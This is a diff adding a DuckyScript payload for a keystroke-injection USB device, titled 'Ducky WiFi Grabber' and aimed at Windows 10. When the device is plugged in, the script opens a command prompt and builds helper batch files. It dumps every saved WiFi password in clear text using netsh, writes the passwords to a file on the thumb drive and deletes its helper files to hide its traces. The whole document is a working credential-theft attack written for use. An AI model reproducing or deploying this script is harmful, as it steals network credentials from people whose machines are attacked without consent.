@@ -1,0 +1,103 @@
+REM Title:         Ducky WiFi Grabber
+REM Description:   Steals wifi passwords and saves to thumb drive on d:
+REM Author:        b4dact0r
+REM Props:         Hak5 Team / Zero_Sploit
+REM Category:      Exfiltration
+REM Target:        Windows 10 (CMD + Powershell)
+REM Version:	   1.0
+REM DuckyScript v: 1
+
+REM Confirm connection
+CAPSLOCK
+DELAY 250
+CAPSLOCK
+DELAY 250
+CAPSLOCK
+DELAY 250
+CAPSLOCK
+DELAY 250
+
+REM Open Cmd
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+
+REM Get all SSIDs
+
+STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
+ENTER
+
+
+REM Create a filter.bat to get all the profile names
+
+STRING echo SETLOCAL EnableDelayedExpansion^
+ENTER
+ENTER
+STRING for /f "tokens=5*" %%i in (a.txt) do (^
+ENTER
+ENTER
+STRING set val=%%i %%j^
+ENTER
+ENTER
+STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
+ENTER
+ENTER
+STRING echo !val!^>^>b.txt) > filter.bat
+ENTER
+
+REM Run filter.bat and save all profile names in b.txt
+
+STRING filter.bat
+DELAY 300
+ENTER
+
+REM Save all the LOOT and delete the other files
+
+STRING copy con saveloot.bat
+ENTER
+STRING @echo off
+ENTER
+STRING set "dst=d:\%COMPUTERNAME%_%date:~-4,4%-%date:~-7,2%-%date:~-10,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
+ENTER
+STRING for /f "tokens=*" %%i in (b.txt) do (
+ENTER
+STRING     echo     SSID: %%i
+ENTER
+STRING     netsh wlan show profiles name="%%i" key=clear | findstr /c:"Key Content"
+ENTER
+STRING     echo.
+ENTER
+STRING ) > "%dst%_wifipasswords.txt"
+ENTER
+STRING del a.txt
+ENTER
+STRING del b.txt
+ENTER
+STRING del filter.bat
+ENTER
+F6
+ENTER
+DELAY 500
+STRING saveloot.bat
+ENTER
+
+STRING del saveloot.bat
+ENTER
+DELAY 200
+
+STRING exit
+ENTER
+
+REM Confirm finished
+CAPSLOCK
+DELAY 250
+CAPSLOCK
+DELAY 250
+CAPSLOCK
+DELAY 250
+CAPSLOCK
+DELAY 250
